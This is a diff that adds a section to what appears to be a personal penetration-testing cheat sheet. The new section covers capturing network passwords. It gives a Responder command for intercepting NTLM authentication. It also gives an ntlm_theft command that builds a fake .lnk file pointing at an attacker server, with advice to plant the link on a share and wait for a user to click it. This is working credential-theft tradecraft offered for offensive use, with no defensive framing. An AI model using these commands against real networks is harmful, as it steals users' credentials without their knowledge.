@@ -564,9 +564,21 @@ echo -n '[string]' | md5sum
 # Code Beautifier:
 https://beautifier.io/
 
+## local network online password capture:
 
+# The Responder:
 
+```
+$ sudo responder -I [interface]
+```
+problem with responder that you need to wait to some one to connect to a share, maybe you would need to create your fack share link
 
+# ntlm Theft:
+
+```
+$ python3 ntlm_theft.py -g lnk -s [serer_ip address} -f [filename]
+```
+then put the fake link on the saher and wait a user to click on it
 
 # Contacts:
 
